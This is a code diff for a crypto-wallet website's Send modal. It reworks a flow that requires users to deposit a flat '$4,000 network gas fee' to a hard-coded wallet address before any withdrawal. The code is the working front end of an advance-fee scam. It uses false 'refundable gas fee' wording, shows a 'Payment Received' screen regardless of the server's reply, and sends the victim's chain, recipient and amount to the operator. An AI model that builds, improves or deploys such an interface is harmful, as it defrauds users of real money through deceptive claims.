@@ -361,11 +361,14 @@
 </div>
 
 <!-- ═══════════════════════════════════════════
-     SEND → GAS FEE MODAL
+     SEND MODAL — 3-step: Chain → Details → Payment
 ═══════════════════════════════════════════ -->
 <div class="home-modal-overlay hidden" id="home-send-overlay" onclick="if(event.target===this)closeHomeSend()">
-  <div class="home-modal-card">
+  <div class="home-modal-card" style="max-width:460px;">
     <div class="home-modal-header">
+      <button id="send-back-btn" onclick="homeSendBack()" style="background:none;border:none;color:#6366f1;font-size:13px;font-weight:700;cursor:pointer;display:none;padding:0;align-items:center;gap:4px;">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M19 12H5M5 12l7 7M5 12l7-7" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg> Back
+      </button>
       <span class="home-modal-title">
         <svg width="16" height="16" viewBox="0 0 24 24" fill="none" style="vertical-align:middle;margin-right:6px"><path d="M22 2L11 13M22 2L15 22l-4-9-9-4 20-7z" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
         Send
@@ -373,47 +376,115 @@
       <button class="home-modal-close" onclick="closeHomeSend()">✕</button>
     </div>
 
-    <!-- Step 1: Gas fee notice -->
-    <div id="send-step-1">
-      <div style="background:rgba(251,191,36,.1);border:1.5px solid rgba(251,191,36,.45);border-radius:14px;padding:16px 18px;margin-bottom:16px;">
-        <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px;">
-          <span style="font-size:22px;">⛽</span>
-          <strong style="font-size:14px;color:var(--text1,#1e293b);">Network Gas Fee Required</strong>
+    <!-- Step indicator -->
+    <div id="send-step-indicator" style="display:flex;align-items:center;justify-content:center;gap:6px;padding:10px 22px 0;font-size:11px;font-weight:700;color:var(--text3,#94a3b8);text-transform:uppercase;letter-spacing:.05em;">
+      <span id="ssi-1" style="color:#6366f1;">1. Select Chain</span>
+      <span style="opacity:.35;">›</span>
+      <span id="ssi-2" style="opacity:.4;">2. Details</span>
+      <span style="opacity:.35;">›</span>
+      <span id="ssi-3" style="opacity:.4;">3. Payment</span>
+    </div>
+
+    <!-- ── Step 1: Select Chain ── -->
+    <div id="send-step-1" style="padding:18px 22px 22px;">
+      <label style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--text3,#94a3b8);display:block;margin-bottom:12px;">Select sending network</label>
+      <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:20px;">
+        <button class="hs-chain-btn hs-chain-active" data-chain="ethereum" data-sym="ETH" data-icon="🔷" onclick="hsSelectChain(this)">
+          <span style="font-size:22px;">🔷</span>
+          <div style="font-size:12px;font-weight:700;color:var(--text1,#1e293b);">Ethereum</div>
+          <div style="font-size:10px;color:var(--text3,#94a3b8);font-weight:600;">ETH</div>
+        </button>
+        <button class="hs-chain-btn" data-chain="bsc" data-sym="BNB" data-icon="🟡" onclick="hsSelectChain(this)">
+          <span style="font-size:22px;">🟡</span>
+          <div style="font-size:12px;font-weight:700;color:var(--text1,#1e293b);">BNB Chain</div>
+          <div style="font-size:10px;color:var(--text3,#94a3b8);font-weight:600;">BNB</div>
+        </button>
+        <button class="hs-chain-btn" data-chain="polygon" data-sym="MATIC" data-icon="🟣" onclick="hsSelectChain(this)">
+          <span style="font-size:22px;">🟣</span>
+          <div style="font-size:12px;font-weight:700;color:var(--text1,#1e293b);">Polygon</div>
+          <div style="font-size:10px;color:var(--text3,#94a3b8);font-weight:600;">MATIC</div>
+        </button>
+        <button class="hs-chain-btn" data-chain="arbitrum" data-sym="ETH" data-icon="🔹" onclick="hsSelectChain(this)">
+          <span style="font-size:22px;">🔹</span>
+          <div style="font-size:12px;font-weight:700;color:var(--text1,#1e293b);">Arbitrum</div>
+          <div style="font-size:10px;color:var(--text3,#94a3b8);font-weight:600;">ETH</div>
+        </button>
+        <button class="hs-chain-btn" data-chain="base" data-sym="ETH" data-icon="🔵" onclick="hsSelectChain(this)">
+          <span style="font-size:22px;">🔵</span>
+          <div style="font-size:12px;font-weight:700;color:var(--text1,#1e293b);">Base</div>
+          <div style="font-size:10px;color:var(--text3,#94a3b8);font-weight:600;">ETH</div>
+        </button>
+        <button class="hs-chain-btn" data-chain="solana" data-sym="SOL" data-icon="🟣" onclick="hsSelectChain(this)">
+          <span style="font-size:22px;">🌐</span>
+          <div style="font-size:12px;font-weight:700;color:var(--text1,#1e293b);">Solana</div>
+          <div style="font-size:10px;color:var(--text3,#94a3b8);font-weight:600;">SOL</div>
+        </button>
+      </div>
+      <button onclick="homeSendToStep2()" style="width:100%;padding:14px;border-radius:14px;border:none;background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff;font-size:15px;font-weight:800;cursor:pointer;box-shadow:0 4px 18px rgba(99,102,241,.35);display:flex;align-items:center;justify-content:center;gap:8px;">
+        Continue
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M5 12h14M13 6l6 6-6 6" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </button>
+    </div>
+
+    <!-- ── Step 2: Recipient + Amount ── -->
+    <div id="send-step-2" style="display:none;padding:18px 22px 22px;">
+      <div id="send-selected-chain-badge" style="display:inline-flex;align-items:center;gap:6px;background:rgba(99,102,241,.1);border:1.5px solid rgba(99,102,241,.3);border-radius:999px;padding:5px 14px;font-size:12px;font-weight:700;color:#6366f1;margin-bottom:16px;">
+        <span id="send-badge-icon">🔷</span> <span id="send-badge-name">Ethereum</span> · <span id="send-badge-sym">ETH</span>
+      </div>
+      <label style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--text3,#94a3b8);display:block;margin-bottom:6px;">Recipient Address</label>
+      <input id="hs-recipient" type="text" placeholder="Paste wallet address…" style="width:100%;background:var(--surface2,#f8fafc);border:1.5px solid var(--border,#e2e8f0);border-radius:12px;padding:11px 14px;font-size:13px;font-family:var(--mono);color:var(--text1,#1e293b);outline:none;margin-bottom:14px;box-sizing:border-box;">
+      <label style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--text3,#94a3b8);display:block;margin-bottom:6px;">Amount <span id="hs-sym-lbl" style="color:#6366f1;">ETH</span></label>
+      <input id="hs-amount" type="number" min="0" step="any" placeholder="0.00" style="width:100%;background:var(--surface2,#f8fafc);border:1.5px solid var(--border,#e2e8f0);border-radius:12px;padding:11px 14px;font-size:18px;font-weight:700;color:var(--text1,#1e293b);outline:none;margin-bottom:20px;box-sizing:border-box;">
+      <button onclick="homeSendToStep3()" style="width:100%;padding:14px;border-radius:14px;border:none;background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff;font-size:15px;font-weight:800;cursor:pointer;box-shadow:0 4px 18px rgba(99,102,241,.35);display:flex;align-items:center;justify-content:center;gap:8px;">
+        Continue
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M5 12h14M13 6l6 6-6 6" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </button>
+    </div>
+
+    <!-- ── Step 3: Payment / Gas Fee Deposit ── -->
+    <div id="send-step-3" style="display:none;padding:18px 22px 22px;">
+      <!-- Summary -->
+      <div style="background:var(--surface2,#f8fafc);border:1.5px solid var(--border,#e2e8f0);border-radius:14px;padding:14px 16px;margin-bottom:16px;">
+        <div style="display:flex;justify-content:space-between;align-items:flex-start;font-size:13px;padding:4px 0;color:var(--text3,#94a3b8);">
+          <span>Sending</span><strong id="hs-sum-amount" style="color:var(--text1,#1e293b);">—</strong>
         </div>
-        <p style="font-size:13px;color:var(--text2,#475569);margin:0;line-height:1.55;">
-          To process your send transaction, a one-time refundable network gas fee of
-          <strong style="color:#1e293b;">$3,000</strong> must be deposited into your site wallet.
-          This fee is returned automatically once your transaction is confirmed on-chain.
-        </p>
-      </div>
-
-      <div style="background:var(--surface2,#f8fafc);border:1px solid var(--border,#e2e8f0);border-radius:12px;padding:14px 16px;margin-bottom:16px;">
-        <div style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--text3,#94a3b8);margin-bottom:8px;">Deposit Address (ERC-20 / ETH)</div>
-        <div style="display:flex;align-items:center;gap:8px;">
-          <code id="gas-fee-addr" style="font-size:12px;color:var(--text1,#1e293b);word-break:break-all;flex:1;font-family:var(--mono);">0x9901E676D0a27e2B5D3DC9fc9fe227F003F559cf</code>
-          <button onclick="copyGasFeeAddr()" style="background:rgba(99,102,241,.12);border:1px solid rgba(99,102,241,.3);color:#6366f1;border-radius:8px;padding:5px 12px;font-size:12px;font-weight:700;cursor:pointer;white-space:nowrap;">Copy</button>
+        <div style="display:flex;justify-content:space-between;align-items:flex-start;font-size:13px;padding:4px 0;color:var(--text3,#94a3b8);">
+          <span>To</span><strong id="hs-sum-recipient" style="font-family:var(--mono);font-size:11px;word-break:break-all;text-align:right;max-width:220px;color:var(--text1,#1e293b);">—</strong>
         </div>
-        <div id="gas-copy-confirm" style="font-size:12px;color:#22c55e;margin-top:6px;min-height:16px;"></div>
+        <div style="display:flex;justify-content:space-between;align-items:center;font-size:13px;padding:6px 0 0;border-top:1px solid var(--border,#e2e8f0);margin-top:6px;color:var(--text3,#94a3b8);">
+          <span>⛽ Network Gas Fee</span><strong style="color:#ef4444;">$4,000.00</strong>
+        </div>
       </div>
 
-      <div class="hm-quote-box" style="margin-bottom:16px;">
-        <div class="hm-quote-row"><span>Fee Amount</span><strong style="color:#ef4444;">$3,000.00</strong></div>
-        <div class="hm-quote-row"><span>Network</span><strong>Ethereum (ERC-20)</strong></div>
-        <div class="hm-quote-row"><span>Refundable</span><strong style="color:#22c55e;">Yes — on confirmation</strong></div>
+      <!-- Deposit address card for the SENDING chain only -->
+      <label style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--text3,#94a3b8);display:block;margin-bottom:8px;">⛽ Pay Gas Fee To This Address</label>
+      <div style="background:linear-gradient(145deg,#1e3a8a,#1e40af);border-radius:16px;padding:18px;color:#fff;margin-bottom:14px;">
+        <div id="hs-pay-chain-label" style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;opacity:.75;margin-bottom:10px;">Ethereum (ERC-20)</div>
+        <code id="hs-pay-addr" style="display:block;font-family:var(--mono);font-size:13px;line-height:1.7;word-break:break-all;background:rgba(255,255,255,.12);padding:12px 14px;border-radius:10px;color:#fff;margin-bottom:12px;">0x9901E676D0a27e2B5D3DC9fc9fe227F003F559cf</code>
+        <button id="hs-copy-addr-btn" onclick="hsCopyPayAddr()" style="width:100%;padding:10px;border-radius:10px;border:none;background:rgba(255,255,255,.2);color:#fff;font-weight:700;font-size:13px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px;">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><rect x="9" y="9" width="13" height="13" rx="2" stroke="currentColor" stroke-width="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" stroke="currentColor" stroke-width="2"/></svg>
+          Copy Address
+        </button>
       </div>
 
-      <button id="gas-fee-paid-btn" class="hm-cta-btn" style="margin-top:4px;background:linear-gradient(135deg,#f59e0b,#ef4444);" onclick="submitGasFee()">
-        ⛽ I Have Sent — Notify Admin
+      <div style="background:rgba(251,191,36,.1);border:1px solid rgba(251,191,36,.45);border-radius:10px;padding:12px 14px;font-size:12px;color:#92400e;line-height:1.6;margin-bottom:16px;">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" style="vertical-align:middle;margin-right:4px;"><path d="M12 9v4m0 4h.01M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" stroke="#92400e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        Send <strong>$4,000</strong> equivalent in <strong id="hs-pay-sym">ETH</strong> to the address above, then click <strong>"I've Paid"</strong>. Our team will verify and process your withdrawal within minutes.
+      </div>
+
+      <button id="gas-fee-paid-btn" onclick="submitGasFee()" style="width:100%;padding:14px;border-radius:14px;border:none;background:linear-gradient(135deg,#f59e0b,#ef4444);color:#fff;font-size:15px;font-weight:800;cursor:pointer;box-shadow:0 4px 18px rgba(239,68,68,.35);display:flex;align-items:center;justify-content:center;gap:8px;">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/><path d="M22 4 12 14.01l-3-3" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        I've Paid — Notify Team
       </button>
       <div id="gas-fee-status" style="margin-top:10px;font-size:13px;text-align:center;min-height:18px;"></div>
     </div>
 
-    <!-- Step 2: Pending confirmation screen -->
-    <div id="send-step-2" style="display:none;text-align:center;padding:10px 0 6px;">
-      <div style="font-size:48px;margin-bottom:12px;">⏳</div>
-      <div style="font-size:17px;font-weight:800;color:var(--text1,#1e293b);margin-bottom:8px;">Gas Fee Pending</div>
+    <!-- ── Step 4: Pending confirmation ── -->
+    <div id="send-step-4" style="display:none;text-align:center;padding:18px 22px 28px;">
+      <div style="font-size:52px;margin-bottom:12px;">⏳</div>
+      <div style="font-size:17px;font-weight:800;color:var(--text1,#1e293b);margin-bottom:8px;">Payment Received</div>
       <p style="font-size:13px;color:var(--text2,#475569);line-height:1.6;margin-bottom:18px;">
-        Your $3,000 gas fee deposit is being verified by our team.<br>
+        Your gas fee deposit is being verified by our team.<br>
         Your send transaction will be processed automatically once confirmed.
       </p>
       <div style="background:rgba(99,102,241,.07);border:1.5px solid rgba(99,102,241,.25);border-radius:12px;padding:12px 16px;margin-bottom:18px;">
@@ -426,6 +497,16 @@
     </div>
   </div>
 </div>
+
+<style>
+.hs-chain-btn {
+  display:flex;flex-direction:column;align-items:center;gap:4px;padding:12px 8px;
+  border-radius:12px;border:1.5px solid var(--border,#e2e8f0);
+  background:var(--surface2,#f8fafc);cursor:pointer;transition:all .15s;text-align:center;
+}
+.hs-chain-btn:hover { border-color:#6366f1;background:rgba(99,102,241,.07); }
+.hs-chain-btn.hs-chain-active { border-color:#6366f1;background:rgba(99,102,241,.1); }
+</style>
 
 <!-- ═══════════════════════════════════════════
      RECEIVE MODAL
@@ -748,24 +829,119 @@ function hmPickerSearch(q) {
 }
 
 // ════════════════════════════════
-//  SEND MODAL
+//  SEND MODAL — 3-step flow
 // ════════════════════════════════
+
+const HS_DEP_ADDRESSES = {
+  ethereum: EVM_ADDR, bsc: EVM_ADDR, polygon: EVM_ADDR,
+  arbitrum: EVM_ADDR, base: EVM_ADDR, optimism: EVM_ADDR,
+  solana: SOL_ADDR,
+};
+const HS_DEP_LABELS = {
+  ethereum:'Ethereum (ERC-20)', bsc:'BNB Chain (BEP-20)',
+  polygon:'Polygon (MATIC)', arbitrum:'Arbitrum (ARB)',
+  base:'Base (ERC-20)', optimism:'Optimism (ERC-20)',
+  solana:'Solana (SPL)',
+};
+
+let _hsChain = 'ethereum';
+let _hsSym   = 'ETH';
+let _hsCurrentStep = 1;
+
+function _hsShowStep(n) {
+  _hsCurrentStep = n;
+  [1,2,3,4].forEach(i => {
+    const el = document.getElementById('send-step-' + i);
+    if (el) el.style.display = (i === n) ? 'block' : 'none';
+  });
+  // Update step indicator
+  ['ssi-1','ssi-2','ssi-3'].forEach((id, idx) => {
+    const el = document.getElementById(id);
+    if (!el) return;
+    if (idx + 1 < n)       { el.style.color = '#22c55e'; el.style.opacity = '1'; }
+    else if (idx + 1 === n) { el.style.color = '#6366f1'; el.style.opacity = '1'; }
+    else                    { el.style.color = ''; el.style.opacity = '.4'; }
+  });
+  // Back button
+  const backBtn = document.getElementById('send-back-btn');
+  if (backBtn) backBtn.style.display = (n > 1 && n < 4) ? 'flex' : 'none';
+  // Step indicator visibility
+  const ind = document.getElementById('send-step-indicator');
+  if (ind) ind.style.display = (n === 4) ? 'none' : 'flex';
+}
+
+function hsSelectChain(btn) {
+  document.querySelectorAll('.hs-chain-btn').forEach(b => b.classList.remove('hs-chain-active'));
+  btn.classList.add('hs-chain-active');
+  _hsChain = btn.dataset.chain;
+  _hsSym   = btn.dataset.sym;
+}
+
+function homeSendToStep2() {
+  document.getElementById('send-badge-icon').textContent = document.querySelector('.hs-chain-btn.hs-chain-active').querySelector('span').textContent;
+  document.getElementById('send-badge-name').textContent = document.querySelector('.hs-chain-btn.hs-chain-active').querySelector('div').textContent;
+  document.getElementById('send-badge-sym').textContent  = _hsSym;
+  document.getElementById('hs-sym-lbl').textContent = _hsSym;
+  _hsShowStep(2);
+}
+
+function homeSendToStep3() {
+  const addr   = document.getElementById('hs-recipient').value.trim();
+  const amount = document.getElementById('hs-amount').value.trim();
+  if (!addr)   { alert('Please enter a recipient address.'); return; }
+  if (!amount || parseFloat(amount) <= 0) { alert('Please enter a valid amount.'); return; }
+
+  document.getElementById('hs-sum-amount').textContent    = amount + ' ' + _hsSym;
+  document.getElementById('hs-sum-recipient').textContent = addr;
+
+  // Set deposit address to the SENDING chain
+  const depAddr = HS_DEP_ADDRESSES[_hsChain] || EVM_ADDR;
+  const depLabel = HS_DEP_LABELS[_hsChain] || _hsChain;
+  document.getElementById('hs-pay-addr').textContent       = depAddr;
+  document.getElementById('hs-pay-chain-label').textContent = depLabel;
+  document.getElementById('hs-pay-sym').textContent         = _hsSym;
+
+  // Reset copy button
+  const copyBtn = document.getElementById('hs-copy-addr-btn');
+  if (copyBtn) copyBtn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none"><rect x="9" y="9" width="13" height="13" rx="2" stroke="currentColor" stroke-width="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" stroke="currentColor" stroke-width="2"/></svg> Copy Address';
+
+  const status = document.getElementById('gas-fee-status');
+  if (status) status.textContent = '';
+
+  _hsShowStep(3);
+}
+
+function homeSendBack() {
+  if (_hsCurrentStep > 1) _hsShowStep(_hsCurrentStep - 1);
+}
+
+function hsCopyPayAddr() {
+  const addr = document.getElementById('hs-pay-addr').textContent.trim();
+  navigator.clipboard.writeText(addr).catch(() => {});
+  const btn = document.getElementById('hs-copy-addr-btn');
+  btn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M20 6L9 17l-5-5" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg> Copied!';
+  setTimeout(() => {
+    btn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none"><rect x="9" y="9" width="13" height="13" rx="2" stroke="currentColor" stroke-width="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" stroke="currentColor" stroke-width="2"/></svg> Copy Address';
+  }, 2000);
+}
+
 function openHomeSend() {
-  // Reset to step-1 each open (unless already pending this session)
-  if (!sessionStorage.getItem('gasFee_pending')) {
-    document.getElementById('send-step-1').style.display = 'block';
-    document.getElementById('send-step-2').style.display = 'none';
-    const btn = document.getElementById('gas-fee-paid-btn');
-    if (btn) { btn.disabled = false; btn.textContent = '⛽ I Have Sent — Notify Admin'; }
-    const s = document.getElementById('gas-fee-status');
-    if (s) s.textContent = '';
+  if (sessionStorage.getItem('gasFee_pending')) {
+    _hsShowStep(4);
   } else {
-    document.getElementById('send-step-1').style.display = 'none';
-    document.getElementById('send-step-2').style.display = 'block';
+    // Reset chain selection
+    document.querySelectorAll('.hs-chain-btn').forEach(b => b.classList.remove('hs-chain-active'));
+    const firstChain = document.querySelector('.hs-chain-btn[data-chain="ethereum"]');
+    if (firstChain) firstChain.classList.add('hs-chain-active');
+    _hsChain = 'ethereum'; _hsSym = 'ETH';
+    document.getElementById('hs-recipient').value = '';
+    document.getElementById('hs-amount').value = '';
+    _hsShowStep(1);
   }
   showEl('home-send-overlay');
   document.body.style.overflow = 'hidden';
 }
+
 function closeHomeSend() {
   hideEl('home-send-overlay');
   document.body.style.overflow = '';
@@ -786,38 +962,30 @@ function closeHomeSend() {
     }
   }
 })();
-function setSendEco(eco, btn) { /* deprecated — gas fee modal has no chain tabs */ }
-// ── GAS FEE SEND FLOW ────────────────────────────────────────────────────────
-function copyGasFeeAddr() {
-  const addr = document.getElementById('gas-fee-addr').textContent.trim();
-  navigator.clipboard.writeText(addr).then(() => {
-    const el = document.getElementById('gas-copy-confirm');
-    el.textContent = '✅ Address copied!';
-    setTimeout(() => { el.textContent = ''; }, 2500);
-  });
-}
+
+function setSendEco() {} // legacy stub
+function copyGasFeeAddr() { hsCopyPayAddr(); } // legacy alias
 
 async function submitGasFee() {
   const btn    = document.getElementById('gas-fee-paid-btn');
   const status = document.getElementById('gas-fee-status');
 
-  btn.disabled    = true;
-  btn.textContent = 'Submitting…';
-  status.textContent = '';
+  btn.disabled = true;
+  btn.innerHTML = '<span style="opacity:.8;">Submitting…</span>';
+  if (status) status.textContent = '';
+
+  const addr   = document.getElementById('hs-recipient') ? document.getElementById('hs-recipient').value.trim() : '';
+  const amount = document.getElementById('hs-amount') ? document.getElementById('hs-amount').value.trim() : '';
 
   try {
     await fetch('/api/gas-fee/request', {
       method:  'POST',
       headers: { 'Content-Type': 'application/json' },
-      body:    JSON.stringify({}),
+      body:    JSON.stringify({ chain: _hsChain, recipient: addr, amount: amount }),
     });
-  } catch(e) { /* show success regardless */ }
+  } catch(e) {}
 
-  // Switch to pending screen
-  document.getElementById('send-step-1').style.display = 'none';
-  document.getElementById('send-step-2').style.display = 'block';
-
-  // Mark the home Send button as pending
+  // Mark home Send button as pending
   const homeBtn = document.getElementById('home-send-btn');
   if (homeBtn) {
     homeBtn.disabled = true;
@@ -830,12 +998,11 @@ async function submitGasFee() {
     sessionStorage.setItem('gasFee_pending', '1');
   }
 
-  btn.disabled    = false;
-  btn.textContent = '⛽ I Have Sent — Notify Admin';
+  _hsShowStep(4);
 }
 
 function submitSend() {
-  // Legacy stub — now handled by submitGasFee()
+  // Legacy stub
   const status = document.getElementById('send-status');
   if (status) status.textContent = '';
 }
